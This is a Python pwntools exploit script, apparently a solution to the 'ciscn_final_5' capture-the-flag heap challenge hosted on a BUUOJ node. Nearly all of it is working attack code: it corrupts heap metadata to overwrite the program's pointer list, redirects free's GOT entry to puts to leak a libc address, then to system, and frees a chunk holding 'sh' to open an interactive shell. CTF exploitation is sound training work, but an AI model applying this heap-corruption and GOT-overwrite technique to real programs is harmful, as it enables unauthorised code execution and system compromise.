# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ciscn_final_5'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28825'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla(':',num)

def add(id,size,content):
    cmd(1)
    sla("dex:",id)
    sla("size:",size)
    sa("content:",content)

def delete(id):
    cmd(2)
    sla("dex:",id)

def edit(id,content):
    cmd(3)
    sla("dex:",id)
    sa("content:",content)

ptr_list = 0x0000000006020E0
free_got = elf.got["free"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

add(0,0x98,"a"*0x20)
delete(0)
add(16,0x18,"a"*0x8)

add(1,0x68,"b")
add(2,0x68,"c")
add(3,0x68,"d")

delete(2)
delete(1)

payload = p64(0) + p64( 0x71) + p64(ptr_list)
edit(0,payload)

add(4,0x68,"d")

payload =  p64( free_got -8 ) + p64( puts_got +1 )  + p64(0) + p64(ptr_list + 0x20 + 3) + "sh\x00"

add(5,0x68,payload)

edit(0,p64(0) + p64(puts_plt))

delete(1)

puts_addr = l64()
libc.address = puts_addr - libc.sym["puts"]
system_addr  = libc.sym["system"]

edit(0,p64(0) + p64(system_addr))
#dbg()

delete(3)


p.interactive()

'''
@File    :   ciscn_final_5.py
@Time    :   2021/07/16 23:04:04
@Author  :   Niyah 
'''